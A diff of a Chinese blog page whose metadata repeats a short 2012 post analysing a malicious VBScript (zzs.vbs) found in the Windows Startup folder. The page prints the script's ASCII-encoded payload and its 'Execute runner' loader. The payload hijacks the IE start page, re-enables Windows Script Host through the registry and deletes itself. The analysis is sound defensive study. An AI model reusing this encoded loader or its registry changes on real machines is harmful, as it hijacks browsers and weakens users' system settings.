@@ -1,11 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
   <head>
+    
+
   <meta charset="utf-8" />
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
 
-  <title>一个恶意vbs脚本的简单解码</title>
+  <title>一个恶意vbs脚本的简单解码 - bystander&#39;s blog</title>
   <meta property="og:title" content="一个恶意vbs脚本的简单解码" />
   <meta name="twitter:title" content="一个恶意vbs脚本的简单解码" />
   <meta name="description" content="今天把电脑还原到了11月7号。结果eset更新后报C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup这个目录有个zzs.vbs的不受欢迎的程序，当时没什么事，就打开看看。想知道是个什么东西。
@@ -16,7 +18,89 @@
 解码嘛。很简单。VS刚好开着。直接写吧。 byte[] strs = {68，101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101}; System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding(); Console.WriteLine(asciiEncoding.GetString(strs)); 运行后输出 Do Set objWMIService = GetObject(&ldquo;winmgmts:\.\root\cimv2&rdquo;) Set colProcesses = objWMIService.ExecQuery(&ldquo;Select * from Win32_Process&rdquo;) FoundProcess = 0 For Each objProcess In colProcesses If objProcess.Name = &ldquo;userinit.exe&rdquo; Then FoundProcess = 1 Exit For End If Next If FoundProcess = 0 Then Exit Do WScript.">
   <meta name="twitter:description" content="今天把电脑还原到了11月7号。结果eset更新后报C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup这个目录有个zzs.vbs的不受欢迎的程序，当时没什么事，就打开看看。想知道是个什么东西。
 由于eset阻止，我就把文件拖出来。改个后缀。发现代码不长，前半段是ascii码编码的。。 strs = …">
-  <meta name="author" content="bystander"/>
+  <meta name="author" content="bystander"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "bystander\x27s blog",
+    
+    "url": "https:\/\/leizhiyuan.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/leizhiyuan.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/leizhiyuan.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/leizhiyuan.github.io\/2012\/11\/25\/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81\/",
+          "name": "一个恶意vbs脚本的简单解码"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : "bystander"
+  },
+  "headline": "一个恶意vbs脚本的简单解码",
+  "description" : "今天把电脑还原到了11月7号。结果eset更新后报C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup这个目录有个zzs.vbs的不受欢迎的程序，当时没什么事，就打开看看。想知道是个什么东西。\n由于eset阻止，我就把文件拖出来。改个后缀。发现代码不长，前半段是ascii码编码的。。 strs = Array(68,111,13,10,32,32,32,32,83,101,116,32,111,98,106,87,77,73,83,101,114,118,105,99,101,32,61,32,71,101,116,79,98,106,101,99,116,40,34,119,105,110,109,103,109,116,115,58,92,92,46,92,114,111,111,116,92,99,105,109,118,50,34,41,13,10,32,32,32,32,83,101,116,32,99,111,108,80,114,111,99,101,115,115,101,115,32,61,32,111,98,106,87,77,73,83,101,114,118,105,99,101,46,69,120,101,99,81,117,101,114,121,40,34,83,101,108,101,99,116,32,42,32,102,114,111,109,32,87,105,110,51,50,95,80,114,111,99,101,115,115,34,41,13,10,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,13,10,32,32,32,32,70,111,114,32,69,97,99,104,32,111,98,106,80,114,111,99,101,115,115,32,73,110,32,99,111,108,80,114,111,99,101,115,115,101,115,13,10,32,32,32,32,32,32,32,32,73,102,32,111,98,106,80,114,111,99,101,115,115,46,78,97,109,101,32,61,32,34,117,115,101,114,105,110,105,116,46,101,120,101,34,32,84,104,101,110,13,10,32,32,32,32,32,32,32,32,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,49,13,10,32,32,32,32,32,32,32,32,32,32,32,32,69,120,105,116,32,70,111,114,13,10,32,32,32,32,32,32,32,32,69,110,100,32,73,102,13,10,32,32,32,32,78,101,120,116,13,10,32,32,32,32,73,102,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,32,84,104,101,110,32,69,120,105,116,32,68,111,13,10,32,32,32,32,87,83,99,114,105,112,116,46,83,108,101,101,112,32,49,48,48,13,10,76,111,111,112,13,10,13,10,115,80,97,103,101,32,61,32,34,104,116,116,112,58,47,47,119,119,119,46,57,57,57,46,99,111,109,47,63,111,110,101,34,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,34,72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,73,110,116,101,114,110,101,116,32,69,120,112,108,111,114,101,114,92,77,97,105,110,92,83,116,97,114,116,32,80,97,103,101,34,44,32,115,80,97,103,101,13,10,13,10,115,82,101,103,80,97,116,104,32,61,32,34,72,75,76,77,92,83,79,70,84,87,65,82,69,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,32,83,99,114,105,112,116,32,72,111,115,116,92,83,101,116,116,105,110,103,115,34,13,10,79,110,32,69,114,114,111,114,32,82,101,115,117,109,101,32,78,101,120,116,13,10,105,69,110,97,98,108,101,100,32,61,32,111,98,106,83,104,101,108,108,46,82,101,103,82,101,97,100,32,95,13,10,40,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,41,13,10,73,102,32,69,114,114,46,78,117,109,98,101,114,32,61,32,48,32,84,104,101,110,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,34,44,32,105,69,110,97,98,108,101,100,44,32,34,82,69,71,95,68,87,79,82,68,34,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,68,101,108,101,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,13,10,69,110,100,32,73,102,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,13,10,83,101,116,32,102,32,61,32,111,98,106,83,104,101,108,108,46,71,101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101) 后半段是 For i = 0 To UBound(strs) runner = runner \x26amp; Chr(strs(i)) Next Execute runner 虽说对vbs不怎么熟，但也知道vbs经常用来写个启动项啊。加个用户啊。之类的。后半句很好懂。就是把ascii码转换成字符串，然后执行。字面意思看看就行了。其实应该可以直接将Execute runner 改为 MsgBox runner就能输出了。但eset不能关闭。所以最后还是选择用C#来写了。\n解码嘛。很简单。VS刚好开着。直接写吧。 byte[] strs = {68，101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101}; System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding(); Console.WriteLine(asciiEncoding.GetString(strs)); 运行后输出 Do Set objWMIService = GetObject(\x26ldquo;winmgmts:\\.\\root\\cimv2\x26rdquo;) Set colProcesses = objWMIService.ExecQuery(\x26ldquo;Select * from Win32_Process\x26rdquo;) FoundProcess = 0 For Each objProcess In colProcesses If objProcess.Name = \x26ldquo;userinit.exe\x26rdquo; Then FoundProcess = 1 Exit For End If Next If FoundProcess = 0 Then Exit Do WScript.",
+  "inLanguage" : "en",
+  "wordCount":  148 ,
+  "datePublished" : "2012-11-25T09:00:59",
+  "dateModified" : "2012-11-25T09:00:59",
+  "image" : "https:\/\/leizhiyuan.github.io\/images\/author.jpg",
+  "keywords" : [ "C＃, windows, 安全, 笔记" ],
+  "mainEntityOfPage" : "https:\/\/leizhiyuan.github.io\/2012\/11\/25\/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/leizhiyuan.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/leizhiyuan.github.io\/images\/author.jpg",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+<meta property="og:title" content="一个恶意vbs脚本的简单解码" />
+<meta property="og:description" content="今天把电脑还原到了11月7号。结果eset更新后报C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup这个目录有个zzs.vbs的不受欢迎的程序，当时没什么事，就打开看看。想知道是个什么东西。
+由于eset阻止，我就把文件拖出来。改个后缀。发现代码不长，前半段是ascii码编码的。。 strs = Array(68,111,13,10,32,32,32,32,83,101,116,32,111,98,106,87,77,73,83,101,114,118,105,99,101,32,61,32,71,101,116,79,98,106,101,99,116,40,34,119,105,110,109,103,109,116,115,58,92,92,46,92,114,111,111,116,92,99,105,109,118,50,34,41,13,10,32,32,32,32,83,101,116,32,99,111,108,80,114,111,99,101,115,115,101,115,32,61,32,111,98,106,87,77,73,83,101,114,118,105,99,101,46,69,120,101,99,81,117,101,114,121,40,34,83,101,108,101,99,116,32,42,32,102,114,111,109,32,87,105,110,51,50,95,80,114,111,99,101,115,115,34,41,13,10,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,13,10,32,32,32,32,70,111,114,32,69,97,99,104,32,111,98,106,80,114,111,99,101,115,115,32,73,110,32,99,111,108,80,114,111,99,101,115,115,101,115,13,10,32,32,32,32,32,32,32,32,73,102,32,111,98,106,80,114,111,99,101,115,115,46,78,97,109,101,32,61,32,34,117,115,101,114,105,110,105,116,46,101,120,101,34,32,84,104,101,110,13,10,32,32,32,32,32,32,32,32,32,32,32,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,49,13,10,32,32,32,32,32,32,32,32,32,32,32,32,69,120,105,116,32,70,111,114,13,10,32,32,32,32,32,32,32,32,69,110,100,32,73,102,13,10,32,32,32,32,78,101,120,116,13,10,32,32,32,32,73,102,32,70,111,117,110,100,80,114,111,99,101,115,115,32,61,32,48,32,84,104,101,110,32,69,120,105,116,32,68,111,13,10,32,32,32,32,87,83,99,114,105,112,116,46,83,108,101,101,112,32,49,48,48,13,10,76,111,111,112,13,10,13,10,115,80,97,103,101,32,61,32,34,104,116,116,112,58,47,47,119,119,119,46,57,57,57,46,99,111,109,47,63,111,110,101,34,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,13,10,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,34,72,75,67,85,92,83,111,102,116,119,97,114,101,92,77,105,99,114,111,115,111,102,116,92,73,110,116,101,114,110,101,116,32,69,120,112,108,111,114,101,114,92,77,97,105,110,92,83,116,97,114,116,32,80,97,103,101,34,44,32,115,80,97,103,101,13,10,13,10,115,82,101,103,80,97,116,104,32,61,32,34,72,75,76,77,92,83,79,70,84,87,65,82,69,92,77,105,99,114,111,115,111,102,116,92,87,105,110,100,111,119,115,32,83,99,114,105,112,116,32,72,111,115,116,92,83,101,116,116,105,110,103,115,34,13,10,79,110,32,69,114,114,111,114,32,82,101,115,117,109,101,32,78,101,120,116,13,10,105,69,110,97,98,108,101,100,32,61,32,111,98,106,83,104,101,108,108,46,82,101,103,82,101,97,100,32,95,13,10,40,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,41,13,10,73,102,32,69,114,114,46,78,117,109,98,101,114,32,61,32,48,32,84,104,101,110,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,87,114,105,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,34,44,32,105,69,110,97,98,108,101,100,44,32,34,82,69,71,95,68,87,79,82,68,34,13,10,32,32,32,32,111,98,106,83,104,101,108,108,46,82,101,103,68,101,108,101,116,101,32,115,82,101,103,80,97,116,104,32,38,32,34,92,69,110,97,98,108,101,100,95,34,13,10,69,110,100,32,73,102,13,10,13,10,83,101,116,32,111,98,106,83,104,101,108,108,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,13,10,83,101,116,32,102,32,61,32,111,98,106,83,104,101,108,108,46,71,101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101) 后半段是 For i = 0 To UBound(strs) runner = runner &amp; Chr(strs(i)) Next Execute runner 虽说对vbs不怎么熟，但也知道vbs经常用来写个启动项啊。加个用户啊。之类的。后半句很好懂。就是把ascii码转换成字符串，然后执行。字面意思看看就行了。其实应该可以直接将Execute runner 改为 MsgBox runner就能输出了。但eset不能关闭。所以最后还是选择用C#来写了。
+解码嘛。很简单。VS刚好开着。直接写吧。 byte[] strs = {68，101,116,70,105,108,101,40,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101,41,13,10,73,102,32,102,46,65,116,116,114,105,98,117,116,101,115,32,65,110,100,32,49,32,84,104,101,110,32,102,46,65,116,116,114,105,98,117,116,101,115,32,61,32,102,46,65,116,116,114,105,98,117,116,101,115,32,45,32,49,13,10,111,98,106,83,104,101,108,108,46,68,101,108,101,116,101,70,105,108,101,32,87,83,99,114,105,112,116,46,83,99,114,105,112,116,70,117,108,108,78,97,109,101}; System.Text.ASCIIEncoding asciiEncoding = new System.Text.ASCIIEncoding(); Console.WriteLine(asciiEncoding.GetString(strs)); 运行后输出 Do Set objWMIService = GetObject(&ldquo;winmgmts:\.\root\cimv2&rdquo;) Set colProcesses = objWMIService.ExecQuery(&ldquo;Select * from Win32_Process&rdquo;) FoundProcess = 0 For Each objProcess In colProcesses If objProcess.Name = &ldquo;userinit.exe&rdquo; Then FoundProcess = 1 Exit For End If Next If FoundProcess = 0 Then Exit Do WScript.">
+<meta property="og:image" content="https://leizhiyuan.github.io/images/author.jpg" />
+<meta property="og:url" content="https://leizhiyuan.github.io/2012/11/25/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="bystander&#39;s blog" />
+
+  <meta name="twitter:title" content="一个恶意vbs脚本的简单解码" />
+  <meta name="twitter:description" content="今天把电脑还原到了11月7号。结果eset更新后报C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup这个目录有个zzs.vbs的不受欢迎的程序，当时没什么事，就打开看看。想知道是个什么东西。
+由于eset阻止，我就把文件拖出来。改个后缀。发现代码不长，前半段是ascii码编码的。。 strs = …">
+  <meta name="twitter:image" content="https://leizhiyuan.github.io/images/author.jpg" />
+  <meta name="twitter:card" content="summary" />
   <link href='https://leizhiyuan.github.io/images/favicon.ico' rel='icon' type='image/x-icon'/>
   <meta property="og:image" content="https://leizhiyuan.github.io/images/author.jpg" />
   <meta name="twitter:image" content="https://leizhiyuan.github.io/images/author.jpg" />
@@ -25,20 +109,17 @@
   <meta property="og:type" content="website" />
   <meta property="og:site_name" content="bystander&#39;s blog" />
 
-  <meta name="generator" content="Hugo 0.55.6" />
-  <link rel="canonical" href="https://leizhiyuan.github.io/2012/11/25/%E4%B8%80%E4%B8%AA%E6%81%B6%E6%84%8Fvbs%E8%84%9A%E6%9C%AC%E7%9A%84%E7%AE%80%E5%8D%95%E8%A7%A3%E7%A0%81/" />
-  <link rel="alternate" href="https://leizhiyuan.github.io/index.xml" type="application/rss+xml" title="bystander&#39;s blog">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.css" integrity="sha384-wITovz90syo1dJWVh32uuETPVEtGigN07tkttEqPv+uR2SE/mbQcG7ATL28aI9H0" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://leizhiyuan.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <meta name="generator" content="Hugo 0.58.0" />
+  <link rel="alternate" href="https://leizhiyuan.github.io/index.xml" type="application/rss+xml" title="bystander&#39;s blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://leizhiyuan.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
   <link rel="stylesheet" href="https://leizhiyuan.github.io/css/highlight.min.css" /><link rel="stylesheet" href="https://leizhiyuan.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
 
 
-</head>
 
+  </head>
   <body>
     <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
   <div class="container-fluid">
@@ -183,11 +264,16 @@
                 <span class="post-meta">
   
   
-  <i class="fa fa-calendar-o"></i>&nbsp;Posted on November 25, 2012
+  <i class="fas fa-calendar"></i>&nbsp;Posted on November 25, 2012
   
   
-  &nbsp;|&nbsp;
-  <i class="fa fa-clock-o"></i> 1 minutes (148 words)
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;1&nbsp;minutes
+  
+  
+  
+    
+      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;bystander
+    
   
   
 </span>
@@ -274,6 +360,8 @@ objShell.DeleteFile WScript.ScriptFullName</pre>
         
 
         
+
+        
       </article>
 
       
@@ -294,6 +382,7 @@ objShell.DeleteFile WScript.ScriptFullName</pre>
 
       
         
+          
           <div class="disqus-comments">
             <div id="disqus_thread"></div>
 <script type="application/javascript">
@@ -316,6 +405,7 @@ objShell.DeleteFile WScript.ScriptFullName</pre>
 <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
 <a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
           </div>
+          
         
         
       
@@ -333,19 +423,17 @@ objShell.DeleteFile WScript.ScriptFullName</pre>
               <li>
                 <a href="https://github.com/leizhiyuan" title="GitHub">
                   <span class="fa-stack fa-lg">
-                    <i class="fa fa-circle fa-stack-2x"></i>
-                    <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                    <i class="fas fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
                   </span>
                 </a>
               </li>
           
           <li>
-            
-            <a href="https://leizhiyuan.github.io/index.xml" title="RSS">
-            
+            <a href="" title="RSS">
               <span class="fa-stack fa-lg">
-                <i class="fa fa-circle fa-stack-2x"></i>
-                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                <i class="fas fa-circle fa-stack-2x"></i>
+                <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
               </span>
             </a>
           </li>
@@ -358,8 +446,10 @@ objShell.DeleteFile WScript.ScriptFullName</pre>
             
           
 
-          &nbsp;&bull;&nbsp;
-          2019
+          &nbsp;&bull;&nbsp;&copy;
+          
+            2019
+          
 
           
             &nbsp;&bull;&nbsp;
@@ -368,25 +458,25 @@ objShell.DeleteFile WScript.ScriptFullName</pre>
         </p>
         
         <p class="credits theme-by text-muted">
-          <a href="http://gohugo.io">Hugo v0.55.6</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
+          <a href="http://gohugo.io">Hugo v0.58.0</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
           
         </p>
       </div>
     </div>
   </div>
-</footer>
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/katex.min.js" integrity="sha384-/y1Nn9+QQAipbNQWU65krzJralCnuOasHncUFXGkdwntGeSvQicrYkiUBwsgUqc1" crossorigin="anonymous"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.7.1/contrib/auto-render.min.js" integrity="sha384-dq1/gEHSxPZQ7DdrM82ID4YVol9BYyU7GbWlIwnwyPzotpoc57wDw/guX8EaYGPx" crossorigin="anonymous"></script>
+</footer><script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
 <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
 <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
 <script src="https://leizhiyuan.github.io/js/main.js"></script>
 <script src="https://leizhiyuan.github.io/js/highlight.min.js"></script>
 <script> hljs.initHighlightingOnLoad(); </script>
-<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
-<script src="https://leizhiyuan.github.io/js/load-photoswipe.js"></script>
+<script> $(document).ready(function() {$("pre.chroma").css("padding","0");}); </script><script> renderMathInElement(document.body); </script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="https://leizhiyuan.github.io/js/load-photoswipe.js"></script>
+
+
+
 
 
 
